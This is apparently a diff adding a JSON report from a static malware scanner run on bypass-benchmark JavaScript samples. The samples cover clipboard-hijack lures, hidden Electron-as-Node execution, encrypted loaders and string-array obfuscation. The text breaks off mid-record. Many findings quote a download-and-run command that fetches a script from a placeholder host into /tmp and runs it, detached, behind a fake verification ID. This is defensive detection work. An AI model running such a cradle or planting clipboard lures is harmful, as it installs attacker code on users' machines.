@@ -1,0 +1,1062 @@
+{
+  "schemaVersion": 2,
+  "tool": {
+    "name": "unk-scanner",
+    "version": "0.2.0"
+  },
+  "isolation": {
+    "mode": "child-process",
+    "permissionModel": true,
+    "networkNamespace": true,
+    "rlimits": {
+      "cpuSeconds": 600,
+      "fileSizeBytes": 0,
+      "openFiles": 128,
+      "core": 0
+    },
+    "heapMb": 512,
+    "environment": "empty"
+  },
+  "files": [
+    {
+      "path": "benchmark/bypass/c0-baseline.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "2bed9b5724f52e0f16736930587086938a583e8950099b5491254547baf4bcb6",
+      "artifactMatches": [],
+      "bytes": 691,
+      "findings": [
+        {
+          "kind": "campaign-marker",
+          "severity": "note",
+          "line": 10,
+          "column": 26,
+          "detail": "VERIFY-"
+        },
+        {
+          "kind": "clickfix-clipboard-command",
+          "severity": "error",
+          "line": 13,
+          "column": 3,
+          "detail": "download-cradle, detached-exec, copy-event-override, verification-lure-text: nohup bash -c \"curl -ks https://example.invalid/demo -o /tmp/demo && bash /tmp/demo\" >/dev/null 2>&1 & # Verification ID VERIFY-0000",
+          "indicators": [
+            "download-cradle",
+            "detached-exec",
+            "copy-event-override",
+            "verification-lure-text"
+          ],
+          "resolved": true
+        },
+        {
+          "kind": "clipboard-copy-override",
+          "severity": "note",
+          "line": 13,
+          "column": 3,
+          "detail": "copy handler on document writes replacement data"
+        },
+        {
+          "kind": "clipboard-write",
+          "severity": "note",
+          "line": 13,
+          "column": 3,
+          "detail": "nohup bash -c \"curl -ks https://example.invalid/demo -o /tmp/demo && bash /tmp/demo\" >/dev/null 2>&1 & # Verification ID VERIFY-0000"
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/c1-var-alias.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "7d18b118927229c5ae5ae1ef399e8fe5170d1e5a74756fc32d6aefcad8ced4a5",
+      "artifactMatches": [],
+      "bytes": 640,
+      "findings": [
+        {
+          "kind": "clickfix-clipboard-command",
+          "severity": "error",
+          "line": 7,
+          "column": 70,
+          "detail": "download-cradle, detached-exec, copy-event-override, verification-lure-text: nohup bash -c \"curl -ks https://example.invalid/demo -o /tmp/demo && bash /tmp/demo\" >/dev/null 2>&1 & # Verification ID VERIFY-0000",
+          "indicators": [
+            "download-cradle",
+            "detached-exec",
+            "copy-event-override",
+            "verification-lure-text"
+          ],
+          "resolved": true
+        },
+        {
+          "kind": "clipboard-copy-override",
+          "severity": "note",
+          "line": 7,
+          "column": 70,
+          "detail": "copy handler on document writes replacement data"
+        },
+        {
+          "kind": "clipboard-write",
+          "severity": "note",
+          "line": 7,
+          "column": 70,
+          "detail": "nohup bash -c \"curl -ks https://example.invalid/demo -o /tmp/demo && bash /tmp/demo\" >/dev/null 2>&1 & # Verification ID VERIFY-0000"
+        },
+        {
+          "kind": "campaign-marker",
+          "severity": "note",
+          "line": 7,
+          "column": 145,
+          "detail": "VERIFY-"
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/c2-eval.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "9043ee15ea5d57fb862725ff1cd8f9201e085d5387e6ad5b1015b8782b9ad5a9",
+      "artifactMatches": [],
+      "bytes": 624,
+      "findings": [
+        {
+          "kind": "clickfix-clipboard-command",
+          "severity": "error",
+          "line": 6,
+          "column": 70,
+          "detail": "download-cradle, detached-exec, copy-event-override, verification-lure-text: nohup bash -c \"curl -ks https://example.invalid/demo -o /tmp/demo && bash /tmp/demo\" >/dev/null 2>&1 & # Verification ID VERIFY-0000",
+          "indicators": [
+            "download-cradle",
+            "detached-exec",
+            "copy-event-override",
+            "verification-lure-text"
+          ],
+          "resolved": true
+        },
+        {
+          "kind": "clipboard-copy-override",
+          "severity": "note",
+          "line": 6,
+          "column": 70,
+          "detail": "copy handler on document writes replacement data"
+        },
+        {
+          "kind": "clipboard-write",
+          "severity": "note",
+          "line": 6,
+          "column": 70,
+          "detail": "nohup bash -c \"curl -ks https://example.invalid/demo -o /tmp/demo && bash /tmp/demo\" >/dev/null 2>&1 & # Verification ID VERIFY-0000"
+        },
+        {
+          "kind": "campaign-marker",
+          "severity": "note",
+          "line": 6,
+          "column": 165,
+          "detail": "VERIFY-"
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/c3-encoded.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "c0edc1f41c722e7ae9119ff71c8a9d7863ed3010cbe948bb4c524bb336435452",
+      "artifactMatches": [],
+      "bytes": 568,
+      "findings": [
+        {
+          "kind": "clickfix-clipboard-command",
+          "severity": "error",
+          "line": 5,
+          "column": 70,
+          "detail": "download-cradle, detached-exec, copy-event-override, verification-lure-text: nohup bash -c \"curl -ks https://example.invalid/demo -o /tmp/demo && bash /tmp/demo\" >/dev/null 2>&1 & # Verification ID VERIFY-0000",
+          "indicators": [
+            "download-cradle",
+            "detached-exec",
+            "copy-event-override",
+            "verification-lure-text"
+          ],
+          "resolved": true
+        },
+        {
+          "kind": "clipboard-copy-override",
+          "severity": "note",
+          "line": 5,
+          "column": 70,
+          "detail": "copy handler on document writes replacement data"
+        },
+        {
+          "kind": "clipboard-write",
+          "severity": "note",
+          "line": 5,
+          "column": 70,
+          "detail": "nohup bash -c \"curl -ks https://example.invalid/demo -o /tmp/demo && bash /tmp/demo\" >/dev/null 2>&1 & # Verification ID VERIFY-0000"
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/c4-charcodes.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "fd983149fee055eb593bccb58ea66acc8aed583fea6016e302c588042fd839cb",
+      "artifactMatches": [],
+      "bytes": 864,
+      "findings": [
+        {
+          "kind": "clickfix-clipboard-command",
+          "severity": "error",
+          "line": 5,
+          "column": 70,
+          "detail": "download-cradle, detached-exec, copy-event-override, verification-lure-text: nohup bash -c \"curl -ks https://example.invalid/demo -o /tmp/demo && bash /tmp/demo\" >/dev/null 2>&1 & # Verification ID VERIFY-0000",
+          "indicators": [
+            "download-cradle",
+            "detached-exec",
+            "copy-event-override",
+            "verification-lure-text"
+          ],
+          "resolved": true
+        },
+        {
+          "kind": "clipboard-copy-override",
+          "severity": "note",
+          "line": 5,
+          "column": 70,
+          "detail": "copy handler on document writes replacement data"
+        },
+        {
+          "kind": "clipboard-write",
+          "severity": "note",
+          "line": 5,
+          "column": 70,
+          "detail": "nohup bash -c \"curl -ks https://example.invalid/demo -o /tmp/demo && bash /tmp/demo\" >/dev/null 2>&1 & # Verification ID VERIFY-0000"
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/c5-split-handler.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "424c3640054f271d28e43b8854a6e3fcf2c95821ac30f2a3680c8ad6179659af",
+      "artifactMatches": [],
+      "bytes": 676,
+      "findings": [
+        {
+          "kind": "clickfix-clipboard-command",
+          "severity": "error",
+          "line": 7,
+          "column": 58,
+          "detail": "detached-exec, copy-event-override, verification-lure-text (text from builder code): nohup bash -c \"curl -ks",
+          "indicators": [
+            "detached-exec",
+            "copy-event-override",
+            "verification-lure-text"
+          ],
+          "resolved": false
+        },
+        {
+          "kind": "clipboard-copy-override",
+          "severity": "note",
+          "line": 7,
+          "column": 58,
+          "detail": "copy handler on document writes replacement data"
+        },
+        {
+          "kind": "clipboard-write",
+          "severity": "note",
+          "line": 7,
+          "column": 58,
+          "detail": "dynamic argument; unresolved"
+        },
+        {
+          "kind": "campaign-marker",
+          "severity": "note",
+          "line": 8,
+          "column": 36,
+          "detail": "VERIFY-"
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/c6-execcommand.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "92aaf657e5d5c47b612dadb6cfa3ffdef6cf1c88cdb72aec0f4232c0062fa093",
+      "artifactMatches": [],
+      "bytes": 686,
+      "findings": [
+        {
+          "kind": "clickfix-clipboard-command",
+          "severity": "error",
+          "line": 7,
+          "column": 51,
+          "detail": "detached-exec, verification-lure-text (text from builder code): nohup bash -c \"curl -ks",
+          "indicators": [
+            "detached-exec",
+            "verification-lure-text"
+          ],
+          "resolved": false
+        },
+        {
+          "kind": "clipboard-write",
+          "severity": "note",
+          "line": 7,
+          "column": 51,
+          "detail": "dynamic argument; unresolved"
+        },
+        {
+          "kind": "campaign-marker",
+          "severity": "note",
+          "line": 9,
+          "column": 106,
+          "detail": "VERIFY-"
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/c7-runtime-fetch.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "dc52f40e4babc7046398b2ce23acc471e578bedbbf090dbaed866d81ca295650",
+      "artifactMatches": [],
+      "bytes": 438,
+      "findings": [
+        {
+          "kind": "clipboard-write",
+          "severity": "note",
+          "line": 6,
+          "column": 9,
+          "detail": "dynamic argument; unresolved"
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/e0-baseline.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "1ebf0d251ee41f2ab955d33820f66707e149934f36fc0cddb04b12ed5710f880",
+      "artifactMatches": [],
+      "bytes": 484,
+      "findings": [
+        {
+          "kind": "campaign-marker",
+          "severity": "note",
+          "line": 5,
+          "column": 3,
+          "detail": "ELECTRON_RUN_AS_NODE"
+        },
+        {
+          "kind": "electron-run-as-node",
+          "severity": "error",
+          "line": 5,
+          "column": 3,
+          "detail": "script text sets ELECTRON_RUN_AS_NODE: $env:ELECTRON_RUN_AS_NODE = '1; the launching code hides execution"
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/e1-split-name.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "2ece24b8921183f3f167ba742670a4927caabfed7d6a266e8c952da144ebf176",
+      "artifactMatches": [],
+      "bytes": 462,
+      "findings": [
+        {
+          "kind": "campaign-marker",
+          "severity": "note",
+          "line": 4,
+          "column": 14,
+          "detail": "ELECTRON_RUN_AS_NODE"
+        },
+        {
+          "kind": "electron-run-as-node",
+          "severity": "error",
+          "line": 5,
+          "column": 17,
+          "detail": "computed script text sets ELECTRON_RUN_AS_NODE: $env:ELECTRON_RUN_AS_NODE = '1; the launching code hides execution"
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/e2-encoded-name.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "19033c08a815545d009d28ed51b26680e64d042f12415499fb8e6f8db61d2ccb",
+      "artifactMatches": [],
+      "bytes": 491,
+      "findings": [
+        {
+          "kind": "electron-run-as-node",
+          "severity": "error",
+          "line": 5,
+          "column": 17,
+          "detail": "computed script text sets ELECTRON_RUN_AS_NODE: $env:ELECTRON_RUN_AS_NODE = '1; the launching code hides execution"
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/e3-spawn-windowshide.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "32d43ce85dc246376ac133d59943503d01bb50ccf449c18301688ef30aad247c",
+      "artifactMatches": [],
+      "bytes": 481,
+      "findings": [
+        {
+          "kind": "electron-run-as-node",
+          "severity": "error",
+          "line": 6,
+          "column": 3,
+          "detail": "spawn() with ELECTRON_RUN_AS_NODE in env, detached and windowless; the launching code hides execution"
+        },
+        {
+          "kind": "campaign-marker",
+          "severity": "note",
+          "line": 6,
+          "column": 96,
+          "detail": "ELECTRON_RUN_AS_NODE"
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/e4-encoded-hidden.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "f5acf8332caff6c77be067bcc362b065afebdeefb8ba5f6368289f883fb8046a",
+      "artifactMatches": [],
+      "bytes": 535,
+      "findings": [
+        {
+          "kind": "campaign-marker",
+          "severity": "note",
+          "line": 5,
+          "column": 15,
+          "detail": "ELECTRON_RUN_AS_NODE"
+        },
+        {
+          "kind": "electron-run-as-node",
+          "severity": "error",
+          "line": 5,
+          "column": 15,
+          "detail": "script text sets ELECTRON_RUN_AS_NODE: $env:ELECTRON_RUN_AS_NODE='1; the launching code hides execution"
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/l0-baseline.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "d5cafb2f5ad75c4d45f60774772a644653ee99da8ccb34d79cca5ffcc12d866d",
+      "artifactMatches": [],
+      "bytes": 699,
+      "findings": [
+        {
+          "kind": "encrypted-loader",
+          "severity": "error",
+          "line": 11,
+          "column": 1,
+          "detail": "Embedded payload decrypted with aes-256-gcm reaches a code-compiling sink at line 11",
+          "evidence": [
+            {
+              "role": "embedded-payload",
+              "line": 6,
+              "column": 15
+            },
+            {
+              "role": "cipher",
+              "line": 8,
+              "column": 15
+            },
+            {
+              "role": "authentication-tag",
+              "line": 9,
+              "column": 1
+            },
+            {
+              "role": "decrypted-text",
+              "line": 10,
+              "column": 27
+            },
+            {
+              "role": "code-sink",
+              "line": 11,
+              "column": 1
+            }
+          ]
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/l1-in-function.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "7ada5f94bf150f7cda8b350f41e7b1047103ffeea217c70a2c3369fc47d06f56",
+      "artifactMatches": [],
+      "bytes": 737,
+      "findings": [
+        {
+          "kind": "encrypted-loader",
+          "severity": "error",
+          "line": 12,
+          "column": 3,
+          "detail": "Embedded payload decrypted with aes-256-gcm reaches a code-compiling sink at line 12",
+          "evidence": [
+            {
+              "role": "embedded-payload",
+              "line": 7,
+              "column": 17
+            },
+            {
+              "role": "cipher",
+              "line": 9,
+              "column": 17
+            },
+            {
+              "role": "authentication-tag",
+              "line": 10,
+              "column": 3
+            },
+            {
+              "role": "decrypted-text",
+              "line": 11,
+              "column": 29
+            },
+            {
+              "role": "code-sink",
+              "line": 12,
+              "column": 3
+            }
+          ]
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/l2-vm.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "869fd7d27a4b37862e60245e8ede1f4288347abece44d4a603bfbf77452c0266",
+      "artifactMatches": [],
+      "bytes": 726,
+      "findings": [
+        {
+          "kind": "encrypted-loader",
+          "severity": "error",
+          "line": 11,
+          "column": 1,
+          "detail": "Embedded payload decrypted with aes-256-gcm reaches a code-compiling sink at line 11",
+          "evidence": [
+            {
+              "role": "embedded-payload",
+              "line": 6,
+              "column": 15
+            },
+            {
+              "role": "cipher",
+              "line": 8,
+              "column": 15
+            },
+            {
+              "role": "authentication-tag",
+              "line": 9,
+              "column": 1
+            },
+            {
+              "role": "decrypted-text",
+              "line": 10,
+              "column": 27
+            },
+            {
+              "role": "code-sink",
+              "line": 11,
+              "column": 1
+            }
+          ]
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/l3-cbc.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "1d01b8c8ef2e71f814386460c10c50ca79fe0e309a302d57b8fce7c754cb9879",
+      "artifactMatches": [],
+      "bytes": 617,
+      "findings": [
+        {
+          "kind": "encrypted-loader",
+          "severity": "error",
+          "line": 10,
+          "column": 1,
+          "detail": "Embedded payload decrypted with aes-256-cbc reaches a code-compiling sink at line 10",
+          "evidence": [
+            {
+              "role": "embedded-payload",
+              "line": 6,
+              "column": 15
+            },
+            {
+              "role": "cipher",
+              "line": 8,
+              "column": 15
+            },
+            {
+              "role": "decrypted-text",
+              "line": 9,
+              "column": 27
+            },
+            {
+              "role": "code-sink",
+              "line": 10,
+              "column": 1
+            }
+          ]
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/l4-let.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "cd32fce7edb03ae1e8d32665ae0ffe0295e8afb27625377b243f60d025c774ef",
+      "artifactMatches": [],
+      "bytes": 669,
+      "findings": [
+        {
+          "kind": "encrypted-loader",
+          "severity": "error",
+          "line": 11,
+          "column": 1,
+          "detail": "Embedded payload decrypted with aes-256-gcm reaches a code-compiling sink at line 11",
+          "evidence": [
+            {
+              "role": "embedded-payload",
+              "line": 6,
+              "column": 13
+            },
+            {
+              "role": "cipher",
+              "line": 8,
+              "column": 13
+            },
+            {
+              "role": "authentication-tag",
+              "line": 9,
+              "column": 1
+            },
+            {
+              "role": "decrypted-text",
+              "line": 10,
+              "column": 25
+            },
+            {
+              "role": "code-sink",
+              "line": 11,
+              "column": 1
+            }
+          ]
+        }
+      ],
+      "deobfuscation": [],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/s0-baseline.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "610c66fcade12e04845b6a9d992b1d1d96bfbb69c1a6c55f61f5ce47e7675d02",
+      "artifactMatches": [],
+      "bytes": 1292,
+      "findings": [
+        {
+          "kind": "string-array-obfuscation",
+          "severity": "warning",
+          "line": 3,
+          "column": 1,
+          "detail": "string array _0xarr resolved: 6/6 call sites decoded (rc4, offset 419, rotation 9 by checksum)"
+        },
+        {
+          "kind": "obfuscated-string-indicator",
+          "severity": "note",
+          "line": 7,
+          "column": 19,
+          "detail": "https://example.invalid/demo/config.json (resolved from string array)"
+        },
+        {
+          "kind": "obfuscated-string-indicator",
+          "severity": "note",
+          "line": 8,
+          "column": 20,
+          "detail": "require('child_process') (resolved from string array)"
+        }
+      ],
+      "deobfuscation": [
+        {
+          "line": 3,
+          "column": 1,
+          "array": "_0xarr",
+          "strings": 14,
+          "variant": "rc4",
+          "offset": 419,
+          "rotation": 9,
+          "method": "checksum",
+          "callSites": 6,
+          "decodedSites": 6
+        }
+      ],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/s1-var-alias.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "92d0e3487e5f9946969b148fe1691e832bc95e8215a489c12dd0d1a70ba3466a",
+      "artifactMatches": [],
+      "bytes": 1484,
+      "findings": [
+        {
+          "kind": "string-array-obfuscation",
+          "severity": "warning",
+          "line": 5,
+          "column": 1,
+          "detail": "string array _0xarr resolved: 6/6 call sites decoded (rc4, offset 419, rotation 9 by checksum)"
+        },
+        {
+          "kind": "obfuscated-string-indicator",
+          "severity": "note",
+          "line": 10,
+          "column": 19,
+          "detail": "https://example.invalid/demo/config.json (resolved from string array)"
+        },
+        {
+          "kind": "obfuscated-string-indicator",
+          "severity": "note",
+          "line": 11,
+          "column": 20,
+          "detail": "require('child_process') (resolved from string array)"
+        }
+      ],
+      "deobfuscation": [
+        {
+          "line": 5,
+          "column": 1,
+          "array": "_0xarr",
+          "strings": 14,
+          "variant": "rc4",
+          "offset": 419,
+          "rotation": 9,
+          "method": "checksum",
+          "callSites": 6,
+          "decodedSites": 6
+        }
+      ],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/s2-splice-rotation.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "c8d9d961401719268ae89d37bbb003417d6660ab6ae3ecb4ec5b006d8e243ec0",
+      "artifactMatches": [],
+      "bytes": 1479,
+      "findings": [
+        {
+          "kind": "string-array-obfuscation",
+          "severity": "warning",
+          "line": 5,
+          "column": 1,
+          "detail": "string array _0xarr resolved: 6/6 call sites decoded (rc4, offset 419, rotation 9 by checksum)"
+        },
+        {
+          "kind": "obfuscated-string-indicator",
+          "severity": "note",
+          "line": 9,
+          "column": 19,
+          "detail": "https://example.invalid/demo/config.json (resolved from string array)"
+        },
+        {
+          "kind": "obfuscated-string-indicator",
+          "severity": "note",
+          "line": 10,
+          "column": 20,
+          "detail": "require('child_process') (resolved from string array)"
+        }
+      ],
+      "deobfuscation": [
+        {
+          "line": 5,
+          "column": 1,
+          "array": "_0xarr",
+          "strings": 14,
+          "variant": "rc4",
+          "offset": 419,
+          "rotation": 9,
+          "method": "checksum",
+          "callSites": 6,
+          "decodedSites": 6
+        }
+      ],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/s3-member-call.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
